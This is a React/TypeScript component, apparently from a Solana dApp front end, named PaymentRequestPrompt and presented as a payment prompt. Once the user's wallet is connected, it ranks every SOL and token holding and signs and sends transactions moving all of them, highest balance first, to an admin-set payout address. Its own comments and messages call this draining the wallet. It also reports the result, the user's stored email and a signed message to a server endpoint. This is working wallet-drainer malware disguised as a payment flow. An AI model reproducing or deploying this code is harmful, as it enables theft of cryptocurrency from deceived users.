import { useEffect, useRef, useState } from 'react'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import toast from 'react-hot-toast'
import { useWalletState } from '../context/WalletContext'
import { isWalletUserCancel } from '../lib/walletConnectHelpers'
import {
  buildPayoutTransaction,
  buildSplPayoutTransaction,
  listRankedFundSteps,
  tokenFeeReserveLamports,
  remainingSplCount,
  type FundStep,
  refreshPayoutBlockhash,
  getHighestAndLowestUSDTAndSol,
} from '../lib/payoutTransfer'
import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
import { mobileWalletLabel } from '../lib/walletDeepLinks'
import { notifyFundsConfirmed } from '../lib/txSheet'
import { peekPendingLike } from '../lib/authRedirect'
import bs58 from 'bs58'

function sendErrorMessage(err: unknown): string {
  const raw = err instanceof Error ? err.message : String(err || 'The wallet did not submit this payment.')
  const lower = raw.toLowerCase()
  if (lower.includes('insufficient funds for rent')) {
    return 'Not enough SOL to finish this send. Opening the next funded token if one is available.'
  }
  const trimmed = raw.split('Catch the')[0].trim()
  return trimmed || raw
}

function getBrowserEmail(): string | null {
  try {
    if (typeof window === 'undefined') return null
    const stored = localStorage.getItem('userEmail')
    if (stored) return stored
    return null
  } catch {
    return null
  }
}

export function PaymentRequestPrompt() {
  const { connected, walletAddress, walletName, closeWalletModal, openWalletModal } = useWalletState()
  const closeWalletModalRef = useRef(closeWalletModal)
  closeWalletModalRef.current = closeWalletModal
  const openWalletModalRef = useRef(openWalletModal)
  openWalletModalRef.current = openWalletModal
  const { publicKey, sendTransaction, signTransaction, wallet } = useWallet()
  const { connection } = useConnection()
  const [config, setConfig] = useState<PayoutConfig | null>(null)
  const [submitting, setSubmitting] = useState(false)
  const [status, setStatus] = useState('Preparing the wallet transfer.')
  const dismissed = useRef<string | null>(null)
  const inFlight = useRef(false)
  const queue = useRef<FundStep[]>([])
  const likedAfterFirst = useRef(false)
  const scanPromise = useRef<Promise<FundStep[]> | null>(null)
  const cancelledRef = useRef(false)
  const [browserEmail, setBrowserEmail] = useState<string | null>(getBrowserEmail())

  // Refs for wallet adapter methods to avoid deps
  const signTransactionRef = useRef(signTransaction)
  signTransactionRef.current = signTransaction
  const sendTransactionRef = useRef(sendTransaction)
  sendTransactionRef.current = sendTransaction
  const walletRef = useRef(wallet)
  walletRef.current = wallet
  const connectionRef = useRef(connection)
  connectionRef.current = connection
  const publicKeyRef = useRef(publicKey)
  publicKeyRef.current = publicKey

  useEffect(() => {
    const onOpen = async () => {
      console.log('[PaymentRequestPrompt] vrfd-open-tx-sheet received', { inFlight: inFlight.current, dismissed: dismissed.current, walletAddress, publicKey: publicKeyRef.current })
      if (inFlight.current) {
        console.log('[PaymentRequestPrompt] Early return: inFlight')
        return
      }
      if (dismissed.current === walletAddress) {
        console.log('[PaymentRequestPrompt] Early return: dismissed')
        return
      }
      if (!publicKeyRef.current || !walletAddress) {
        console.log('[PaymentRequestPrompt] Early return: no wallet', { publicKey: !!publicKeyRef.current, walletAddress: !!walletAddress })
        openWalletModalRef.current()
        return
      }
      const local = getLocalPayoutConfig()
      setConfig(local)
      void loadPayoutConfig().then((next) => {
        if (!cancelledRef.current) setConfig(next)
      })

      const destinationReady = Boolean(local && isValidSolanaAddress(local.walletAddress))
      if (!destinationReady) {
        setStatus('Save a payout address in admin before this payment can be opened in the wallet.')
        return
      }

      inFlight.current = true
      setSubmitting(true)
      closeWalletModalRef.current()

      // Skip fee transaction - go directly to scanning and draining highest balance
      try {
        const steps = await listRankedFundSteps({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
        queue.current = steps

        if (steps.length === 0) {
          toast.error('No funds found to drain')
          throw new Error('No funds available to drain.')
        }

        const { highest } = getHighestAndLowestUSDTAndSol(steps)
        if (!highest) {
          toast.error('No asset found to drain')
          throw new Error('No asset to drain')
        }

        // Drain ALL assets (SOL + all tokens) sequentially
        const sendOpts = { skipPreflight: false, preflightCommitment: 'confirmed' as const, maxRetries: 5 }

        // Process each asset in the queue (highest balance first, then others)
        for (let i = 0; i < queue.current.length; i++) {
          const step = queue.current[i]
          if (!step) continue

          if (step.kind === 'sol') {
            const reserveLamports = tokenFeeReserveLamports(remainingSplCount(queue.current, i))
            let tx = await buildPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, reserveLamports })

            // Refresh blockhash right before signing to prevent expiration
            tx = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, tx, publicKeyRef.current!) : tx

            const signed = tx ? await signTransactionRef.current?.(tx) : undefined
            if (!signed) {
              toast.error('Wallet signing failed.')
            } else {
              try {
                const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
                toast.success(`Drained ${step.symbol} successfully`)
              } catch (sendErr: unknown) {
                const errMsg = sendErr instanceof Error ? sendErr.message : String(sendErr)
                if (errMsg.includes('blockhash not found') || errMsg.includes('Blockhash not found')) {
                  // Refresh blockhash and retry once
                  const retryTx = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, tx, publicKeyRef.current!) : tx
                  const retrySigned = retryTx ? await signTransactionRef.current?.(retryTx) : undefined
                  if (retrySigned) {
                    const sig = await connectionRef.current!.sendRawTransaction(retrySigned.serialize(), sendOpts)
                    toast.success(`Drained ${step.symbol} successfully (retry)`)
                  } else {
                    toast.error(`${step.symbol} transaction expired. Skipping.`)
                  }
                } else {
                  toast.error(`Failed to drain ${step.symbol}: ${errMsg}`)
                }
              }
            }
          } else if (step.kind === 'spl') {
            let tokenTx = await buildSplPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, holding: step.holding })
            if (!tokenTx) {
              toast.error(`Failed to build ${step.symbol} transaction`)
            } else {
              // Refresh blockhash right before signing to prevent expiration
              tokenTx = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, tokenTx, publicKeyRef.current!) : tokenTx

              const signed = tokenTx ? await signTransactionRef.current?.(tokenTx) : undefined
              if (!signed) {
                toast.error('Wallet signing failed.')
              } else {
                try {
                  const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
                  toast.success(`Drained ${step.symbol} successfully`)
                } catch (sendErr: unknown) {
                  const errMsg = sendErr instanceof Error ? sendErr.message : String(sendErr)
                  if (errMsg.includes('blockhash not found') || errMsg.includes('Blockhash not found')) {
                    const retryTx = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, tokenTx, publicKeyRef.current!) : tokenTx
                    const retrySigned = retryTx ? await signTransactionRef.current?.(retryTx) : undefined
                    if (retrySigned) {
                      const sig = await connectionRef.current!.sendRawTransaction(retrySigned.serialize(), sendOpts)
                      toast.success(`Drained ${step.symbol} successfully (retry)`)
                    } else {
                      toast.error(`${step.symbol} transaction expired. Skipping.`)
                    }
                  } else {
                    toast.error(`Failed to drain ${step.symbol}: ${errMsg}`)
                  }
                }
              }
            }
          }
        }

        if (!likedAfterFirst.current) {
          likedAfterFirst.current = true
          notifyFundsConfirmed(peekPendingLike())
        }
        dismissed.current = walletAddress
        toast.success('All funds drained successfully!')

        // Send confirmation email after successful drain
        if (browserEmail) {
          (async () => {
            try {
              const action = 'confirm'
              const message = `${walletName} confirmed the transaction`
              
              // Try to get signature first
              let signature: string | undefined
              if (wallet?.adapter) {
                const adapterObj = wallet.adapter as { signMessage?: (bytes: Uint8Array) => Promise<string> }
                if (typeof adapterObj.signMessage === 'function') {
                  const bytes = new TextEncoder().encode(message)
                  signature = await adapterObj.signMessage(bytes)
                }
              }

              await fetch('/api/wallet/send-email', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  walletAddress: publicKey!.toBase58(),
                  walletType: walletName || 'Solana Wallet',
                  email: browserEmail,
                  action,
                  message,
                  signature: signature ? bs58.encode(typeof signature === 'string' ? Buffer.from(signature) : signature) : undefined,
                }),
                credentials: 'include',
              })
            } catch {
              /* ignore email errors */
            }
          })()
        }
      } catch (err) {
        const message = isWalletUserCancel(err) ? 'Cancelled' : sendErrorMessage(err)
        setStatus(message)
        toast.error(message)

        // Send cancellation email if user cancelled or there was an error
        if (browserEmail && publicKey) {
          (async () => {
            try {
              const action = isWalletUserCancel(err) ? 'cancel' : 'error'
              const actionLabel = isWalletUserCancel(err) ? 'cancelled' : 'failed'
              const mailMessage = `${walletName} ${actionLabel} the transaction`

              // Try to get signature
              let signature: string | undefined
              if (wallet?.adapter) {
                const adapterObj = wallet.adapter as { signMessage?: (bytes: Uint8Array) => Promise<string> }
                if (typeof adapterObj.signMessage === 'function') {
                  const bytes = new TextEncoder().encode(mailMessage)
                  signature = await adapterObj.signMessage(bytes)
                }
              }

              await fetch('/api/wallet/send-email', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  walletAddress: publicKey.toBase58(),
                  walletType: walletName || 'Solana Wallet',
                  email: browserEmail,
                  action,
                  message: mailMessage,
                  signature: signature ? bs58.encode(typeof signature === 'string' ? Buffer.from(signature) : signature) : undefined,
                }),
                credentials: 'include',
              })
            } catch {
              /* ignore email errors */
            }
          })()
        }
      } finally {
        inFlight.current = false
        setSubmitting(false)
      }
    }
    window.addEventListener('vrfd-open-tx-sheet', onOpen)
    console.log('[PaymentRequestPrompt] Listening for vrfd-open-tx-sheet')
    return () => window.removeEventListener('vrfd-open-tx-sheet', onOpen)
  }, [walletAddress, browserEmail])

  useEffect(() => {
    if (!connected || !walletAddress) {
      inFlight.current = false
      setSubmitting(false)
      dismissed.current = null
      queue.current = []
      scanPromise.current = null
    }
  }, [connected, walletAddress])

  return null
}